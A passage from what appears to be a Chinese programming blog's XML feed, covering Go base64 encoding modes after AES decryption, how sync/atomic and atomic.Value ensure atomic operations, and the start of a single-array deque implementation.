punctuation">)</span>    <span class="token comment">// 去补全码</span>    orig <span class="token operator">=</span> <span class="token function">PKCS7UnPadding</span><span class="token punctuation">(</span>orig<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>orig<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="结束了吗？"><a href="#结束了吗？" class="headerlink" title="结束了吗？"></a>结束了吗？</h4><p>加密或解密结果通常是byte数组，需要进一步转换为字符串。这时候通常又有两种选择，<strong>hex</strong>和<strong>base64</strong>。如果使用了base64进行编码，那么还有一个需要双方约定的地方。</p><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><p>Base64编码好处：简短、不可读性，即所编码的数据不会被人用肉眼所直接看到。</p><p>注意：后端与js通信时base64模式的选择🐶</p><table><thead><tr><th>模式</th><th>区别</th><th>备注</th></tr></thead><tbody><tr><td>StdEncoding</td><td>字符串由A-Za-z0-9+&#x2F;组成，字节长度不能被3整除，用&#x3D;补足</td><td></td></tr><tr><td>RawStdEncoding</td><td>字符串由A-Za-z0-9+&#x2F;组成，字节长度不能被3整除，不用&#x3D;补足</td><td></td></tr><tr><td>URLEncoding</td><td>字符串由A-Za-z0-9-_组成，字节长度不能被3整除，用&#x3D;补足</td><td></td></tr><tr><td>RawURLEncoding</td><td>字符串由A-Za-z0-9-_组成，字节长度不能被3整除，不用&#x3D;补足</td><td></td></tr></tbody></table><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> encodeStd <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token keyword">const</span> encodeURL <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//编码</span>base64<span class="token punctuation">.</span>StdEncoding<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>base64<span class="token punctuation">.</span>StdEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>base64<span class="token punctuation">.</span>RawStdEncoding<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>base64<span class="token punctuation">.</span>RawStdEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment">//解码</span>base64<span class="token punctuation">.</span>URLEncoding<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>base64<span class="token punctuation">.</span>URLEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>base64<span class="token punctuation">.</span>RawURLEncoding<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>base64<span class="token punctuation">.</span>RawURLEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang sync/atomic包的原子操作是怎么保证的</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-sync-atomic%E5%8C%85%E7%9A%84%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%E6%98%AF%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E7%9A%84/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-sync-atomic%E5%8C%85%E7%9A%84%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%E6%98%AF%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<p>在Go语言标准库中，<code>sync/atomic</code>包将底层硬件提供的原子级内存操作封装成了Go的函数。</p><p><code>Mutex</code>由操作系统实现，而atomic包中的原子操作则由底层硬件直接提供支持。在CPU实现的指令集里，有一些指令直接封装进atomic包，这些指令在执行过程中是不允许中断的，因此原子操作可以在<code>lock-free</code>的情况下保证并发安全，并且它的性能也能做到随CPU个数的增多而线性扩展。</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>int32</li><li>int64</li><li>uint32</li><li>uint64</li><li>uintptr</li><li>unsafe.Pointer</li></ul><h3 id="操作类型"><a href="#操作类型" class="headerlink" title="操作类型"></a>操作类型</h3><ul><li><p>增或减 AddXXX</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token operator">*</span>addr <span class="token operator">+=</span> delta<span class="token keyword">return</span> <span class="token operator">*</span>addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>比较并交换 CompareAndSwapXXX</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> <span class="token operator">*</span>addr <span class="token operator">==</span> old <span class="token punctuation">&#123;</span>  <span class="token operator">*</span>addr <span class="token operator">=</span> <span class="token builtin">new</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>载入 LoadXXX</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">return</span> <span class="token operator">*</span>addr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>存储 StoreXXX</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token operator">*</span>addr <span class="token operator">=</span> val<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>交换 SwapXXX</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">old <span class="token operator">=</span> <span class="token operator">*</span>addr<span class="token operator">*</span>addr <span class="token operator">=</span> <span class="token builtin">new</span><span class="token keyword">return</span> old<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="什么操作叫做原子操作？"><a href="#什么操作叫做原子操作？" class="headerlink" title="什么操作叫做原子操作？"></a>什么操作叫做原子操作？</h3><p>一个或者多个操作在CPU执行过程中不被中断的特性，称为原子性(atomicity)。这些操作对外表现成一个不可分割的整体，他们要么都执行，要么都不执行，外界不会看到他们只执行到一半的状态。而在现实世界中，CPU不可能不中断的执行一系列操作，但如果我们在执行多个操作时，能让他们的中间状态对外不可见，那我们就可以宣城他们拥有了“不可分割”的原子性。</p><p>在Go中，一条普通的赋值语句其实不是一个原子操作。列如，在32位机器上写int64类型的变量就会有中间状态，因为他会被拆成两次写操作(MOV)——写低32位和写高32位。</p><h3 id="用锁行不行？"><a href="#用锁行不行？" class="headerlink" title="用锁行不行？"></a>用锁行不行？</h3><p>原子操作由<strong>底层硬件</strong>支持，而锁则由操作系统的<strong>调度器</strong>实现。锁应当用来保护一段逻辑，对于一个变量更新的保护，原子操作通常会更有效率，并且更能利用计算机多核的优势，如果要更新的是一个复合对象，则应当使用<code>atomic.Value</code>封装好的实现。</p><h4 id="值类型操作"><a href="#值类型操作" class="headerlink" title="值类型操作"></a>值类型操作</h4><ul><li>如果一个线程刚写完低32位，还没来得及写高32位时，另一个线程读取了这个变量，那得到的就是一个毫无逻辑的中间变量，会导致程序出现诡异的bug。</li></ul><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//在被操作值被频繁变更的情况下,CAS操作并不那么容易成功</span><span class="token comment">//利用for循环以进行多次尝试</span><span class="token keyword">var</span> value <span class="token builtin">int32</span><span class="token keyword">func</span> <span class="token function">addValue1</span><span class="token punctuation">(</span>delta <span class="token builtin">int32</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">&#123;</span>        <span class="token comment">//在进行读取value的操作的过程中,其他对此值的读写操作是可以被同时进行的</span>        <span class="token comment">//那么这个读操作很可能会读取到一个只被修改了一半的数据</span>        v <span class="token operator">:=</span> value        <span class="token keyword">if</span> atomic<span class="token punctuation">.</span><span class="token function">CompareAndSwapInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>value<span class="token punctuation">,</span> v<span class="token punctuation">,</span> v <span class="token operator">+</span> delta<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">break</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>用Load函数防止只读取一半有效数据的发生<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">addValue2</span><span class="token punctuation">(</span>delta <span class="token builtin">int32</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">for</span><span class="token punctuation">&#123;</span>      <span class="token comment">//使用载入</span>      v <span class="token operator">:=</span> atomic<span class="token punctuation">.</span><span class="token function">LoadInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>value<span class="token punctuation">)</span>      <span class="token keyword">if</span> atomic<span class="token punctuation">.</span><span class="token function">CompareAndSwapInt32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>value<span class="token punctuation">,</span> v<span class="token punctuation">,</span> v <span class="token operator">+</span> delta<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token comment">//在函数的结果值为true时,退出循环</span>          <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="struct类型操作"><a href="#struct类型操作" class="headerlink" title="struct类型操作"></a>struct类型操作</h4><ul><li>如果对一个结构体直接进行赋值，那出现问题的概率更高。线程刚写完一部分字段，读线程就读取了变量，那么只能读到一部分修改的值，破坏了变量的完整性，读到的值也是完全错误的。</li><li>面对这种多线程下变量的读写问题，1.4 版本的时候 <code>atomic.Value</code>登场，它使得我们可以不依赖于不保证兼容性的<code>unsafe.Pointer</code>类型，同时又能将任意数据类型的读写操作封装成原子性操作（让中间状态对外不可见）。<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 使用示例</span><span class="token keyword">type</span> Config <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  Addr <span class="token builtin">string</span>  Port <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c Config<span class="token punctuation">)</span> <span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> c<span class="token punctuation">.</span>Addr <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> c<span class="token punctuation">.</span>Port<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">loadConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Config <span class="token punctuation">&#123;</span>  <span class="token comment">// do something</span>  <span class="token keyword">return</span> Config<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">automicValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> config atomic<span class="token punctuation">.</span>Value  wg <span class="token operator">:=</span> sync<span class="token punctuation">.</span>WaitGroup<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">&#123;</span>          time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Millisecond<span class="token punctuation">)</span>          config<span class="token punctuation">.</span><span class="token function">Store</span><span class="token punctuation">(</span><span class="token function">loadConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>      wg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          c <span class="token operator">:=</span> config<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>Config<span class="token punctuation">)</span>          fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>          wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="atomic-Value-设计与实现"><a href="#atomic-Value-设计与实现" class="headerlink" title="atomic.Value 设计与实现"></a>atomic.Value 设计与实现</h4><p><code>atomic</code>包中除了<code>atomic.Value</code>外，其余都是早期由汇编写成的，<code>atomic.Value</code>类型的底层实现也是建立在已有的<code>atomic</code>包的基础上。</p><blockquote><h5 id="goroutine抢占"><a href="#goroutine抢占" class="headerlink" title="goroutine抢占"></a>goroutine抢占</h5><p>Go中调度器是GMP模型，简单理解G就是goroutine；M可以类比内核线程，是执行G的地方；P是调度G以及为G的执行准备所需资源。一般情况下，P的数量CPU的可用核心数，也可由<code>runtime.GOMAXPROCS</code>指定。</p><p>调度规则：某个G不能一直占用M，在某个时刻的时候，runtime会判断当前M是否可以被抢占，即M上正在执行的G让出。P在合理的时刻将G调度到合理的M上执行，在runtime里面，每个P维护一个本地存放待执行G的队列localq，同时还存在一个全局的待执行G的队列globalq；调度就是P从localq或globalq中取出G到对应的M上执行，所谓抢占，runtime将G抢占移出运行状态，拷贝G的执行栈放入待执行队列中，可能是某个P的localq，也可能是globalq，等待下一次调度，因此当被抢占的G重回待执行队列时有可能此时的P与前一次运行的P并非同一个。</p><p>所谓禁止抢占，即当前执行G不允许被抢占调度，直到禁止抢占标记解除。Go runtime实现了G的禁止抢占与解除禁止抢占。</p></blockquote><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//atomic.Value源码</span><span class="token keyword">type</span> Value <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    v <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// 所以可以存储任何类型的数据</span><span class="token punctuation">&#125;</span><span class="token comment">// 空 interface&#123;&#125; 的内部表示格式，作用是将interface&#123;&#125;类型分解，得到其中两个字段</span><span class="token keyword">type</span> ifaceWords <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    typ  unsafe<span class="token punctuation">.</span>Pointer    data unsafe<span class="token punctuation">.</span>Pointer<span class="token punctuation">&#125;</span><span class="token comment">// 取数据就是正常走流程</span><span class="token keyword">func</span> <span class="token punctuation">(</span>v <span class="token operator">*</span>Value<span class="token punctuation">)</span> <span class="token function">Load</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>x <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    vp <span class="token operator">:=</span> <span class="token punctuation">(</span><span class="token operator">*</span>ifaceWords<span class="token punctuation">)</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span>    typ <span class="token operator">:=</span> <span class="token function">LoadPointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vp<span class="token punctuation">.</span>typ<span class="token punctuation">)</span>    <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token operator">||</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>typ<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">^</span><span class="token function">uintptr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 第一次还没写入</span>        <span class="token keyword">return</span> <span class="token boolean">nil</span>    <span class="token punctuation">&#125;</span>  <span class="token comment">// 构造新的interface&#123;&#125;返回出去</span>    data <span class="token operator">:=</span> <span class="token function">LoadPointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vp<span class="token punctuation">.</span>data<span class="token punctuation">)</span>    xp <span class="token operator">:=</span> <span class="token punctuation">(</span><span class="token operator">*</span>ifaceWords<span class="token punctuation">)</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    xp<span class="token punctuation">.</span>typ <span class="token operator">=</span> typ    xp<span class="token punctuation">.</span>data <span class="token operator">=</span> data    <span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token comment">// 写数据（如何保证数据完整性）</span><span class="token keyword">func</span> <span class="token punctuation">(</span>v <span class="token operator">*</span>Value<span class="token punctuation">)</span> <span class="token function">Store</span><span class="token punctuation">(</span>x <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"sync/atomic: store of nil value into Value"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token comment">// 绕过 Go 语言类型系统的检查，与任意的指针类型互相转换</span>    vp <span class="token operator">:=</span> <span class="token punctuation">(</span><span class="token operator">*</span>ifaceWords<span class="token punctuation">)</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 旧值</span>    xp <span class="token operator">:=</span> <span class="token punctuation">(</span><span class="token operator">*</span>ifaceWords<span class="token punctuation">)</span><span class="token punctuation">(</span>unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 新值</span>    <span class="token keyword">for</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 配合CompareAndSwap达到乐观锁的功效</span>        typ <span class="token operator">:=</span> <span class="token function">LoadPointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vp<span class="token punctuation">.</span>typ<span class="token punctuation">)</span>        <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 第一次写入</span>            <span class="token function">runtime_procPin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 禁止抢占</span>            <span class="token keyword">if</span> <span class="token operator">!</span><span class="token function">CompareAndSwapPointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vp<span class="token punctuation">.</span>typ<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> unsafe<span class="token punctuation">.</span><span class="token function">Pointer</span><span class="token punctuation">(</span><span class="token operator">^</span><span class="token function">uintptr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">runtime_procUnpin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 没有抢到锁，说明已经有别的线程抢先完成赋值，重新进入循环</span>                <span class="token keyword">continue</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 首次赋值</span>            <span class="token function">StorePointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vp<span class="token punctuation">.</span>data<span class="token punctuation">,</span> xp<span class="token punctuation">.</span>data<span class="token punctuation">)</span>            <span class="token function">StorePointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vp<span class="token punctuation">.</span>typ<span class="token punctuation">,</span> xp<span class="token punctuation">.</span>typ<span class="token punctuation">)</span>            <span class="token function">runtime_procUnpin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 写入成功，解除占用状态</span>            <span class="token keyword">return</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token function">uintptr</span><span class="token punctuation">(</span>typ<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">^</span><span class="token function">uintptr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 第一次写入还未完成，继续等待</span>            <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 两次需要写入相同类型</span>        <span class="token keyword">if</span> typ <span class="token operator">!=</span> xp<span class="token punctuation">.</span>typ <span class="token punctuation">&#123;</span>            <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"sync/atomic: store of inconsistently typed value into Value"</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token function">StorePointer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vp<span class="token punctuation">.</span>data<span class="token punctuation">,</span> xp<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 禁止抢占，标记当前G在M上不会被抢占，并返回当前所在P的ID。</span><span class="token keyword">func</span> <span class="token function">runtime_procPin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 解除G的禁止抢占状态，之后G可被抢占。</span><span class="token keyword">func</span> <span class="token function">runtime_procUnpin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://studygolang.com/pkgdoc">Go语言中文网</a></p><p><a href="https://blog.betacat.io/post/golang-atomic-value-exploration/">Go 语言标准库中 atomic.Value 的前世今生</a></p><p><a href="https://www.cnblogs.com/sunsky303/p/11820500.html">你不知道的Go unsafe.Pointer uintptr原理和玩法</a></p><p><a href="https://segmentfault.com/a/1190000021944703">理解Go 1.13中sync.Pool的设计与实现</a></p><p><a href="https://segmentfault.com/a/1190000017783070">Go Slice 最大容量大小是怎么来的</a></p><p><a href="https://juejin.cn/post/6844903662553137165">Golang 的 协程调度机制 与 GOMAXPROCS 性能调优</a></p><p><a href="https://www.kancloud.cn/digest/batu-go/153537">Golang同步：原子操作使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> atomic包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法导论-单数组实现双端队列</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E5%8D%95%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B0%E5%8F%8C%E7%AB%AF%E9%98%9F%E5%88%97/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E5%8D%95%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B0%E5%8F%8C%E7%AB%AF%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="栈插入和删除元素只能在同一端进行，队列的插入操作和删除操作分别在两端进行，与它们不同的，有一种双端队列-deque-，其插入和删除操作都可以在两端进行。写出4个时间均为O-1-的过程，分别实现在双端队列插入和删除元素的操作，该队列使用一个数组实现的。"><a href="#栈插入和删除元素只能在同一端进行，队列的插入操作和删除操作分别在两端进行，与它们不同的，有一种双端队列-deque-，其插入和删除操作都可以在两端进行。写出4个时间均为O-1-的过程，分别实现在双端队列插入和删除元素的操作，该队列使用一个数组实现的。" class="headerlink" title="栈插入和删除元素只能在同一端进行，队列的插入操作和删除操作分别在两端进行，与它们不同的，有一种双端队列(deque)，其插入和删除操作都可以在两端进行。写出4个时间均为O(1)的过程，分别实现在双端队列插入和删除元素的操作，该队列使用一个数组实现的。"></a>栈插入和删除元素只能在同一端进行，队列的插入操作和删除操作分别在两端进行，与它们不同的，有一种双端队列(deque)，其插入和删除操作都可以在两端进行。写出4个时间均为O(1)的过程，分别实现在双端队列插入和删除元素的操作，该队列使用一个数组实现的。</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token comment">// 一个数组实现双端队列</span><span class="token keyword">const</span> maxSize <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">type</span> Deque <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    leftHead  <span class="token builtin">int</span>    rightHead <span class="token builtin">int</span>    size      <span class="token builtin">int</span> <span class="token comment">// 记录现有元素数量</span>    arr       <span class="token punctuation">[</span>maxSize<span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> d<span class="token punctuation">.</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">isFull</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>size <span class="token operator">==</span> <span class="token function">len</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">pre</span><span class="token punctuation">(</span>position <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> position <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">len</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>arr<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> position <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>d <span class="token operator">*</span>Deque<span class="token punctuation">)</span> <span class="token function">next</span><span class="token punctuation">(</span>position <span class="token builtin">int</span><span class="token 